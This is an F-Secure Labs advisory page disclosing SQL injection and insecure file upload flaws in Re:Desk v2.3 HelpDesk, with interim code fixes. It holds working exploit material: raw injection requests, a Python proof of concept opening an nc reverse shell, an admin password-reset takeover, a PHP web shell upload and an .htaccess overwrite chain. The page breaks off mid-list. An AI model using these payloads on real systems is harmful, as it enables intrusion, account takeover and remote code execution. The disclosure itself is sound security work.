<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Re:Desk v2.3 - Multiple Issues</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/redesk-v2-3-multiple-issues/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/redesk-v2-3-multiple-issues/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/redesk-v2-3-multiple-issues/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Re:Desk v2.3 - Multiple Issues</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Re:Desk v2.3</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>High</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2020-15487, CVE-2020-15488, CVE-2020-15849</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>SQLi/RCE</td>
          </tr>
        </table>
        
        <h1><span style="text-decoration: underline;">Description</span></h1><p>F-Secure consulting discovered several vulnerabilities in Re-Desk's commercial HelpDesk software, version 2.3. Re-Desk offers helpdesk and ticketing software aimed at small to medium sized businesses. Re-Desk HelpDesk is a PHP-based web application which allows users to create and track service tickets. It is built using <a title="version 1.1 of the Yii PHP framework" href="https://www.yiiframework.com/">version 1.1 of the Yii PHP framework</a>, and it can be configured to use MySQL, MariaDB and PostgreSQL databases.</p><p>Re-Desk HelpDesk version 2.3 is vulnerable to the following issues:</p><ul>
<li>Blind unauthenticated SQL injection (CVE-2020-15487)</li>
<li>Blind authenticated SQL injection (CVE-2020-15849)</li>
<li>Insecure file upload (CVE-2020-15488)</li>
</ul><p>These issues were discovered by downloading and reviewing the codebase for a <a title="30-day trial version of the application" href="https://www.re-desk.com/download-help-desk-software.html">30-day trial version of the application</a>, which is advertised as being identical to the commercial version, save for several licensing restrictions. The application was installed following the vendor's <a title="official documentation" href="https://www.re-desk.com/installation-instructions.html">official documentation</a>, using a MySQL 8.0.20 database and PHP 7.2 on Ubuntu 20.04.</p><h1><span style="text-decoration: underline;">Impact</span></h1><p>These issues can be leveraged to achieve the following:</p><ul>
<li><strong>Unauthenticated Remote Command Execution (RCE)</strong>, via unauthenticated SQL injection and abuse of the Yii framework's "Business Rule" functionality.</li>
<li><strong>Authorization bypass</strong>, via recovering or overwriting password reset tokens via unauthenticated SQL injection, allowing unauthenticated users to take over the account of any Re-Desk user.</li>
<li><strong>Authenticated RCE</strong>, via abuse of authenticated or unauthenticated SQL injection and a separate insecure file upload flaw.</li>
</ul><p>Proof-of-Concept (PoC) code was written that uses the identified vulnerabilities to automatically exploit the application.</p><h1><span style="text-decoration: underline;">Remediation &amp; Disclaimer<br></span></h1><p>At this time, Re-Desk has not acknowledged any vulnerabilities in Re-Desk version 2.3, nor have any official patches or updated software versions been released. Multiple attempts to contact the software vendor were made, yet no response has been received as of the publication date of this advisory. However, included in this report are unofficial fixes which may be used as temporary workarounds, to prevent the application from being susceptible to the vulnerabilities discussed below.</p><p>These unofficial fixes have not been validated by Re-Desk, and they should only be used as guidance until Re-Desk has officially patched the application. Additionally, these unofficial fixes have not been subject to thorough testing. Any out-of-band changes to the application's code should be tested before being implemented in production environments.</p><p><span style="text-decoration-line: underline; font-family: FSecureSansHeadline, &#039;Arial Black&#039;, Arial, sans-serif; font-size: 2em;">CVE-2020-15487 - Unauthenticated SQL Injection</span></p><p>Below is the call to the vulnerable <strong>getBaseCriteria()</strong> method, on line 314 in the <strong>TicketController</strong> controller (<strong>protected/controllers/TicketController.php)</strong>:</p><pre><span style="font-family: Courier New, serif;"><span style="font-size: medium;">$criteria = Ticket::getBaseCriteria($_REQUEST['filter'], <br>$_REQUEST['selector'], <br>$_REQUEST['q'], <br>$_REQUEST['folder']);</span></span></pre><p>The <strong>folder</strong> parameter can be referenced in a GET or POST request to the application's base URL:</p><pre><span style="font-family: Courier New, serif;"><span style="font-size: medium;">https://re-desk-instance.com/?folder=1</span></span></pre><p>The <strong>getBaseCriteria()</strong> method performs input sanitisation on the <strong>$folder</strong> variable, if the <strong>folder</strong> parameter is referenced as a singular value. However, if the <strong>folder</strong> parameter is referenced as an array in requests made to the application, the application does not sanitize the parameter's values before creating an SQL query string from the array’s contents. This is shown below, in the relevant section of the <strong>getBaseCriteria()</strong> method from line 859 in the <strong>Ticket</strong> model (<strong>protected/models/Ticket.php</strong>):</p><pre><span style="font-family: Courier New, serif;"><span style="font-size: medium;">if (is_array($folder))<br> <strong>$sql .= ' AND folder_id IN (' . implode(', ', $folder) . ')';<br>elseif (!empty($folder))<br>{<br> $sql .= ' AND folder_id = :folder_id';<br> $sql_params[':folder_id'] = $folder;<br>}</strong></span></span></pre><p>The following unauthenticated GET request can be used to execute MySQL's <strong>sleep()</strong> function, causing the application's database to pause for five seconds:</p><pre><span style="font-family: Courier New, serif;"><span style="font-size: medium;">GET /?folder[]=1337))%20GROUP%20BY%20ticket.id)%20sq;%20select%20sleep(5);%20-- HTTP/1.1<br>Host: example-host.com<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1</span></span></pre><p>Arbitrary SQL queries may be executed this way, as there are no length or character restrictions when referencing values in an array through the <strong>folder</strong> query string parameter. The following screenshot shows the result of a similar request, causing the application's MySQL thread to pause for five seconds:</p><p><img class="leftAlone" style="display: block; margin-left: auto; margin-right: auto;" title="" src="assets/Uploads/_resampled/ResizedImageWzc4MCw2MDdd/emailTemplate-sql-inj-sleep-6.png" alt="emailTemplate sql inj sleep 6" width="780" height="607"></p><h4><span style="text-decoration: underline;">Interim Workaround</span></h4><p><br>To prevent SQL injection as shown above, the following modifications can be made to the <strong>Ticket</strong> model (<strong>protected/models/Ticket.php</strong>), within the <strong>getBaseCriteria()</strong> method:</p><pre><span style="font-family: Courier New, serif;"><span style="font-size: medium;">if (is_array($folder))<br>{<br> <strong>$folder_s = [];</strong><br><strong> for($i = 0; $i &lt; count($folder); $i++) {</strong><br><strong>  $key = ':item_' . $i;</strong><br><strong>  array_push($folder_s, $key);</strong><br><strong>  $sql_params[$key] = $folder[$i];</strong><br><strong>  }</strong><br><strong> $sql .= ' AND folder_id IN (' . implode(', ', $folder_s) . ')';</strong> <br>}elseif (!empty($folder))<br>{<br> $sql .= ' AND folder_id = :folder_id';<br> $sql_params[':folder_id'] = $folder;<br>}<br>$criteria-&gt;params = $sql_params;<br>$criteria-&gt;condition = $sql;<br>$criteria-&gt;with = 'messages';<br>return $criteria;</span></span></pre><p>This code block uses the <strong>params</strong> array of the Yii framework’s <strong>CDbCriteria</strong> object, which escapes characters provided to SQL queries. This prevents arbitrary SQL queries from being possible via CVE-2020-15487.</p><h4><span style="text-decoration: underline;">Unauthenticated Remote Command Execution via SQL Injection (CVE-2020-15487) and the Yii Framework’s “Business Rule” Functionality</span></h4><p><br>The Yii Framework supports a Role-Based Access Control (RBAC) mechanism known as “<a title="Business Rules" href="https://www.yiiframework.com/doc/guide/1.1/en/topics.auth#using-business-rules">Business Rules</a>”. These are small sections of PHP code which are stored in a Yii-based application’s database. Depending on whether the Business Rule evaluates to true or false, access may be granted or denied based on a user's assigned RBAC roles.</p><p>If it is possible to alter the database of a Yii-based application, it is therefore possible to overwrite Business Rules with arbitrary PHP code. As the application contained a Business Rule entry for an unauthenticated “All” role, the role's Business Rule may then be executed simply by requesting any page in the application whilst unauthenticated. Effectively, this allowed for any SQL injection vulnerability to result in remote command execution. However, note that this is subject to the following restrictions:</p><ul>
<li>Version 1.1 of the Yii framework must be in use by the affected application.</li>
<ul>
<li>The more recent Yii2 framework implements Business Rule functionality differently, avoiding the risks of relying on potentially modifiable PHP code (see <a title="https://github.com/yiisoft/yii2/pull/471/files" href="https://github.com/yiisoft/yii2/pull/471/files">https://github.com/yiisoft/yii2/pull/471/files)</a></li>
</ul>
<li>The <strong>CDbAuthManager</strong> class, which extends the <strong>CAuthManager</strong> parent class, must be used to implement RBAC functionality</li>
<li>The <strong>executeBizRule()</strong> method of the <strong>CAuthManager</strong> class must be used by the application.</li>
</ul><p>Re-Desk versoin 2.3 satisfied these requirements. Business Rules are stored in the application’s <strong>AuthItem</strong> table, The screenshot below shows the default records for the table after installing Re:Desk 2.3:</p><p><img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzExNjMsNDIyXQ/authitem-default-red.png" alt="authitem default red" width="1163" height="422"></p><p>The following code block shows a call to the <strong>eval()</strong> function, in the <strong>executeBizRule()</strong> method in the <strong>yii/framework/web/auth/CAuthManager.php</strong> class. This method executes a given Business Rule based on the current user context. Browsing to any page in the application as an unauthenticated user will result in the “All” Business Rule being executed:</p><pre>public function executeBizRule($bizRule,$params,$data)<br>{<br> if($bizRule==='' || $bizRule===null)<br>  return true;<br> if ($this-&gt;showErrors)<br>  return eval($bizRule)!=0;<br> else<br> {<br>  try<br>  {<br>   return @eval($bizRule)!=0;<br>  }<br>  catch (ParseError $e)<br>  {<br>   return false;<br>  }<br> }<br>}</pre><p>Via CVE-2020-15487, the following POST request can be made which updates the Business Rule for the “All” role in the AuthItem table:</p><pre>POST / HTTP/1.1<br>Host: 192.168.56.102<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 201<br><br>folder[]=1337))+GROUP+BY+ticket.id)+sq%3b+update+AuthItem+set+bizrule+%3d+"system('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+192.168.56.104+80+&gt;/tmp/f')%3b"+where+name+%3d+"All"%3b+--</pre><p>This results in the following PHP code being placed in the record:</p><p><img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzExNjMsMTc1XQ/updated-bizrule-all.png" alt="updated bizrule all" width="1163" height="175"></p><p>This <strong>bizrule</strong> value will then be evaluated by the <strong>executeBizRule()</strong> method after a request is made to any page. The screenshot below shows this rule pending execution whilst debugging the application using Visual Studio Code:</p><p>  <img class="leftAlone" style="display: block; margin-left: auto; margin-right: auto;" title="" src="assets/Uploads/_resampled/ResizedImageWzExNjIsMzkwXQ/debugger-rev-shell-executeBizrule2.png" alt="debugger rev shell executeBizrule2" width="1162" height="390"></p><p>The following exploit code leverages CVE-2020-15487 to update the Business Rule for the <strong>All</strong> user context with PHP code, which initiated a reverse TCP shell to an IP address and port supplied as command line arguments. After the Business Rule is executed, SQL injection is used to return the Business Rule back to the default value of "<strong>return false;</strong>":</p><pre>import requests<br>import sys<br>import uuid<br><br>requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)<br>proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}<br><br>def update_bizrule(ip, cmd):<br>    headers = {'Content-Type' : 'application/x-www-form-urlencoded',<br>    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}<br>    ip = ip + '/'<br>    if cmd == '':<br>        cmd = 'return+false%3b'<br>    bizrule = 'folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+update+AuthItem+set+bizrule+%%3d+"%s"+where+name+%%3d+"All"%%3b+--' % cmd<br>    r = requests.post(ip, bizrule, headers=headers, proxies = proxies)<br>    return True<br><br>def fetch_revshell(ip):<br>    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}<br>    url = '%s/' % ip<br>    try:<br>        r = requests.get(url, headers=headers, timeout=3.0, proxies=proxies)<br>    except requests.exceptions.ReadTimeout:<br>        print("[+] shell command probably executed")<br>        pass<br><br>def main():<br>    print("\n[+] RE:Desk v2.3 unauthenticated SQLI + unsafe bizRule eval() RCE")<br>    print("\n[!] this PoC uses an unauthenticated SQLi vulnerability to update the AuthItem table's bizRule record for the 'All' user context,")<br>    print("[!] resulting in unauthenticated RCE when refreshing any page\n")<br>    if len(sys.argv) &lt; 4:<br>        print("[!] usage: python3 %s &lt;target&gt; &lt;rev_ip&gt; &lt;rev_port&gt;" % sys.argv[0])<br>        print('[!] eg: python3 %s https://example.com/redesk/ 127.0.0.1 80' % sys.argv[0])<br>        sys.exit(-1)<br>    ip = sys.argv[1]<br>    rev_ip = sys.argv[2]<br>    rev_port = sys.argv[3]<br>    print("[*] updating bizrule column for 'All' user context in AuthItem table...")<br>    cmd = "system('rm+/tmp/f%%3bmkfifo+/tmp/f%%3bcat+/tmp/f|/bin/sh+-i+2&gt;%%261|nc+%s+%s+&gt;/tmp/f')%%3b" % (rev_ip, rev_port)<br>    update_bizrule(ip, cmd)<br>    print("[*] calling shell, check nc...")<br>    fetch_revshell(ip)<br>    print("[*] reverting bizrule...")<br>    update_bizrule(ip, '')<br>    sys.exit(0)    <br><br>if __name__ == "__main__":<br>    main()</pre><p>This PoC exploit can also be found at <a title="https://github.com/FSecureLABS/Re-Desk-v2.3-Vulnerabilities" href="https://github.com/FSecureLABS/Re-Desk-v2.3-Vulnerabilities">https://github.com/FSecureLABS/Re-Desk-v2.3-Vulnerabilities</a>.The following screenshot shows this PoC code in action against the application:</p><p><img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzExNjIsNDUwXQ/bizrule-final-rce6.png" alt="bizrule final rce6" width="1162" height="450"></p><h4><br><span style="text-decoration: underline;">Potential Mitigation for Business Rule abuse: ExpressionLanguage</span><br><br></h4><p>It may be possible to mitigate the increased risks inherent to SQL injection for applications based on version 1.1 of the Yii framework, without refactoring the application's codebase to use the more recent Yii2 framework. This can be done by overriding the <strong>executeBizRule()</strong> method of the <strong>CDbAuthManager</strong> class with a custom method which implements the <a title="ExpressionLanguage component from the Symphony framework." href="https://symfony.com/doc/current/components/expression_language.html#how-can-the-expression-engine-help-me">ExpressionLanguage component from the Symfony framework.</a></p><p>ExpressionLanguage essential offers a restricted PHP sandbox, in which variables must be explicitly declared before they can be used in an expression. However, it may still be possible to achieve arbitrary command execution if untrusted user input is directly evaluated. Modifying the application to use the ExpressionLanguage component was not attempted due to time constraints.</p><h4><span style="text-decoration: underline;">Authorization bypass via CVE-2020-15487</span><br><br></h4><p>Via SQL injection, the application’s password reset functionality can be abused to reset the password of arbitrary Re:Desk accounts. The <strong>RecoveryController</strong> controller (<strong>protected/modules/user/controllers/RecoveryController.php</strong>) implements logic for issuing password reset tokens, referred to as “<strong>activkeys</strong>”. <strong>activkeys</strong> are either MD5 or SHA1 hashes of the user’s current password hash concatenated with the current timestamp.</p><p><strong>activkeys</strong> are stored in the <strong>tbl_users</strong> table, shown in the screenshot below:<br><br><img class="leftAlone" style="display: block; margin-left: auto; margin-right: auto;" title="" src="assets/Uploads/activkey-admin-orig3.png" alt="activkey admin orig3" width="431" height="168"></p><p><br>The following request leverages CVE-2020-15487 to overwrite the admin user’s <strong>activkey</strong> with a known value:<br><br></p><pre>GET /?folder[]=1337))+GROUP+BY+ticket.id)+sq%3b+UPDATE+tbl_users+SET+activKey+%3d+"<strong>bd73dff9545a4302a89571a3fbbf6361</strong>"+WHERE+id+%3d+1%3b+-- HTTP/1.1<br>Host: 192.168.56.102<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1</pre><p>The known <strong>activkey</strong> value can be used in the following POST request to reset the <strong>admin</strong> user's password:</p><pre>POST /user/recovery/recovery?email=admin%40nowhere.org&amp;activkey=bd73dff9545a4302a89571a3fbbf6361 HTTP/1.1<br>Host: 192.168.56.102<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: PHPSESSID=ma398kv407283c60l5hg0bmbce<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 106<br><br>UserChangePassword%5Bpassword%5D=NEW_PASSWORD&amp;UserChangePassword%5BverifyPassword%5D=NEW_PASSWORD&amp;yt0=Save</pre><h3><span style="text-decoration: underline;">CVE-2020-15488 - Insecure File Upload</span></h3><p class="western"><span style="font-size: medium;"><span style="font-weight: normal;">The <strong>showImage()</strong> method in the <strong>MessageAttachment</strong> model (</span><strong>protected/models/MessageAttachment.php</strong>) <span style="font-weight: normal;">does not validate the file extension o</span><span style="font-weight: normal;">r contents of</span><span style="font-weight: normal;"> uploaded files. By leveraging an SQL injection vulnerability to change database records, it is possible to achieve remote command execution by means of overwriting a .<strong>htaccess</strong> file within the web root and subsequently uploading files containing PHP code.</span></span></p><p class="western"><span style="font-size: medium;"><span style="font-weight: normal;">The application stores uploaded files, expected to be images, in hexadecimal format, in the <strong>tbl_ticket_message_attachments</strong> database table. When previewing a file, the file’s contents are written to disk in the </span><span style="font-style: normal;"><span style="font-weight: normal;"><strong>protected/runtime</strong> directory. </span></span></span></p><pre class="western"><span style="font-size: medium;"><span style="font-style: normal;"><span style="font-weight: normal;">public function showImage()<br>{<br><br>    list(, $file_type) = explode('/', $this-&gt;file_type);<br>    $img_path = Yii::getPathOfAlias('application.runtime') . '/' . $this-&gt;id . '.' . $file_type;<br>    file_put_contents($img_path, $this-&gt;content);<br><br>    /**<br>     * @var Image $image<br>     */<br>    $image = Yii::app()-&gt;image-&gt;load($img_path);<br>    if (!empty($_REQUEST['width']))<br>        $image-&gt;resize($_REQUEST['width'], 200);<br><br>    $image-&gt;render();<br>    return unlink($img_path);<br><br>}</span></span></span></pre><p class="western"><span style="font-size: medium;"><span style="font-style: normal;"><span style="font-weight: normal;">if the file's <strong>Content-Type</strong> is not part of the predefined set, an error will be thrown as shown in the <strong>isImage()</strong> method:</span></span></span></p><pre><span style="font-size: medium;"><span style="font-style: normal;"><span style="font-weight: normal;">public function isImage()<br>{<br> $image_types = array (<br>  'image/png',<br>  'image/jpg',<br>  'image/jpeg',<br>  'image/gif',<br> );<br><br> return in_array($this-&gt;file_type, $image_types);<br>}<br></span></span></span></pre><p><span style="font-size: medium;">The following request, containing the relevant section of multipart form data, can be used to bypass file upload restrictions, allowing the file's contents to be stored in the database:<br></span></p><pre><span style="font-size: medium;">POST /ticket/create HTTP/1.1<br>Host: 192.168.56.102<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://192.168.56.102/ticket/create<br>Content-Type: multipart/form-data; boundary=---------------------------174006745313917532212017749950<br>Content-Length: 1020<br>Connection: close<br>Cookie: PHPSESSID=pq4mu07a9rktsevjvul287om3f<br>Upgrade-Insecure-Requests: 1<br><br>-----------------------------174006745313917532212017749950<br>Content-Disposition: form-data; name="Ticket[subject]"<br><br>test01<br><br>[SNIP]<br><br>-----------------------------174006745313917532212017749950<br><strong>Content-Disposition: form-data; name="attachments[]"; filename="test1.txt"</strong><br><strong>Content-Type: image/php</strong><br><br><strong>&lt;?php system($_GET['cmd']); ?&gt;</strong></span></pre><p><span style="font-size: medium;">Note that file contents are never validated. Additionally, filenames are discarded, and the uploaded file’s primary key of the <strong>tbl_ticket_message_attachment</strong> are used instead as filenames. However, the second part of the file’s <strong>Content-Type</strong> is retained and used as the file extension of the uploaded file. Therefore, the 13<sup>th</sup> file uploaded to the webserver as shown above will be written to disk as <strong>protected/runtime/13.php</strong>.</span></p><p>The file's contents can then be written to the <strong>protected/runtime</strong> directory via the following request. The file's ID, specified below as "1" at the end of the URL, may be derived via blind SQL injection (CVE-2020-15487, CVE-2020-15849) or brute-forced:</p><pre style="font-weight: normal;"><span style="font-size: medium;">GET <strong>/ticketMessage/preview/1</strong> HTTP/1.1<br>Host: 192.168.56.102<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: PHPSESSID=5vvjsen4fe6p0actpfhkgc8mo1<br>Upgrade-Insecure-Requests: 1<br></span></pre><p style="font-weight: normal;"><span style="font-size: medium;">Assuming a file containing a simple PHP web shell is stored in the <strong>tbl_ticket_message_attachment</strong> table with the primary key value of 1, the following file will be written to disk:</span></p><pre style="font-weight: normal;"><span style="font-size: medium;">root@ubuntu-testbed:/var/www/html/protected/runtime# ls -al 1.php <br><strong>-rw-r--r-- 1 www-data www-data 31 May 9 03:49 1.php</strong><br>root@ubuntu-testbed:/var/www/html/protected/runtime# cat 1.php <br><strong>&lt;?php system($_GET['cmd']); ?&gt;</strong><br>root@ubuntu-testbed:/var/www/html/protected/runtime# file 1.php <br><strong>1.php: PHP script, ASCII text</strong><br>root@ubuntu-testbed:/var/www/html/protected/runtime#</span></pre><p class="western">Note that no authentication is required to preview uploaded files and write the files to the appropriate directory. Additionally the application may be configured to allow unauthenticated users to upload a limited number of files. However, to upload files without authentication, a CAPTCHA challenge-response test must be successfully completed. A method to bypass the CAPTCHA response was not investigated.</p><h4 class="western"><span style="text-decoration: underline;">Interim Workaround</span><br><br></h4><p>The following modification to the <strong>showImage()</strong> method uses the <strong>isImage()</strong> method to prevent the application from writing files to the <span style="font-size: medium;"><strong>protected/runtime</strong></span> directory, should the files fail the extension check performed by the <strong>showImage()</strong> method:</p><pre>public function showImage()<br>{<br> <strong>   if($this-&gt;isImage())</strong><br><strong>    {</strong><br>        list(, $file_type) = explode('/', $this-&gt;file_type);<br>        $img_path = Yii::getPathOfAlias('application.runtime') . '/' . $this-&gt;id . '.' . $file_type;<br>        file_put_contents($img_path, $this-&gt;content);<br><br>        /**<br>         * @var Image $image<br>         */<br>        $image = Yii::app()-&gt;image-&gt;load($img_path);<br>        if (!empty($_REQUEST['width']))<br>            $image-&gt;resize($_REQUEST['width'], 200);<br><br>        $image-&gt;render();<br>        return unlink($img_path);<br><br><strong>    }</strong><br>    <br>}</pre><p>This modification will not be sufficient in preventing determined attackers from uploading malicious code to the web server. For instance, it may still be possible to include malicious code in EXIF/metadata headers. This was not tested; however, the above modification will prevent the attack as described in this advisory.</p><h4><span style="text-decoration: underline;">Authentication Bypass via SQL Injection (CVE-2020-15147) + Remote Command Execution via Insecure file upload (CVE-2020-15488)</span></h4><p style="font-weight: normal;"><br>The insecure file upload vulnerability alone is not sufficient to gain command execution on the web server, as<span style="font-size: medium;"> the application writes a <strong>.htaccess</strong> file to the <strong>protected</strong> directory containing a "<strong>deny from all</strong>" rule,  which prevents arbitrary PHP files from executing once written to the filesystem as shown above. As uploaded files are eventually written to the <strong>protected/runtime</strong> directory, this <strong>.htaccess</strong> file must be overwritten.<br></span></p><p style="font-weight: normal;"><span style="font-size: medium;">Therefore, to leverage this insecure file upload vulnerability for the purposes of remote command execution, it is possible to use an SQL injection vulnerability to perform the following, assuming the application uses a MySQL database:</span></p><ul>
<li><span style="font-size: medium;">upload a file containing PHP code, specifying the file extension in the <strong>Content-Type</strong> POST form parameter.<br></span></li>
<li><span style="font-size: medium;">preview the file to write the file to the <strong>protected/runtime</strong> directory<br></span></li>
<li><span style="font-size: medium;">upload a blank file, by specifying the file extension in the <strong>Content-Type</strong> POST form parameter as ‘<strong>image/htaccess</strong>’. The resultant file will therefore be named “<strong>.htaccess</strong>”, based on the logic below from the <strong>showImage()</strong> method, from the <strong>MessageAttachment</strong> class:</span></li>
</ul><pre>list(, $file_type) = explode('/', $this-&gt;file_type);<br>$img_path = Yii::getPathOfAlias('application.runtime') . '/' . $this-&gt;id . '.' . $file_type;<br>file_put_contents($img_path, $this→content);a</pre><ul>
<li><span style="font-size: medium;">via SQL injection, change the type of the primary key of the <strong>tbl_ticket_message_attachment</strong> table from an integer to <strong>varchar(max)</strong>.<br></span></li>
<li><span style="font-size: medium;">change the contents of the primary key column for the uploaded file to <strong>../</strong><br></span></li>
<li><span style="font-size: medium;">preview the file to cause a file with the relative path of “<strong>../.htaccess</strong>” to be written to the <strong>protected</strong> directory.<br></span></li>
<li><span style="font-size: medium;">If not known in advance, use blind SQL injection techniques to obtain the ID for the previously uploaded PHP webshell, and use the ID to make a request to preview the PHP file. This will write the file contents stored in the <strong>tbl_ticket_message_attachment</strong> table to a file in the <strong>protected/runtime</strong> directory.</span></li>
<li><span style="font-size: medium;">As the contents of the <strong>.htaccess</strong> file has been overwritten, the PHP web shell could be executed by visiting the previewed file.</span></li>
</ul><p style="font-weight: normal;"><span style="font-size: medium;">PoC code has been developed which uses unauthenticated blind SQL injection (CVE-2020-15487) together with the insecure file upload vulnerability (CVE-2020-15488) to achieve the following:<br></span></p><ul>
<li><span style="font-size: medium;">Enumerates the application's database for a user with administrative privileges</span></li>
<li><span style="font-size: medium;">Obtains the administrative user's email address via blind SQL injection</span></li>
<li><span style="font-size: medium;">Enables the account, in case the account has been disabled</span></li>
<li><span style="font-size: medium;">Sets the account's <strong>activkey</strong> value to a known, random MD5 value</span></li>
<li><span style="font-size: medium;">Uses the <strong>activkey</strong> to set the user's password to a known random MD5 value</span></li>
<li><span style="font-size: medium;">Bypasses file upload restrictions to upload contents for a blank file to the application's database, with the file extension of <strong>.htaccess</strong><br></span></li>
<li><span style="font-size: medium;">Bypasses file upload restrictions to upload PHP code for a simple web shell to the application's database</span></li>
<li><span style="font-size: medium;">Obtains the ID values for the uploaded file contents</span></li>
<li><span style="font-size: medium;">Temporarily changes the primary key for the<strong> tbl_ticket_message_attachment</strong> table to <strong>varchar(250)</strong></span></li>
<li><span style="font-size: medium;">Sets the primary key for the uploaded blank file to ".<strong>./</strong>"</span></li>
<li><span style="font-size: medium;">Previews the blank file, thus writing a blank file with the relative path of ".<strong>./.htaccess</strong>" to the <strong>protected/runtime</strong> directory</span></li>
<li><span style="font-size: medium;">Previews the file containing PHP code, to write a file containing PHP code to the <strong>protected/runtime</strong> directory</span></li>
<li><span style="font-size: medium;">Uses the uploaded PHP shell to execute the id command to test command execution</span></li>
<li><span style="font-size: medium;">If specified, uses the web shell to initiate a reverse TCP shell to the supplied IP address and port</span></li>
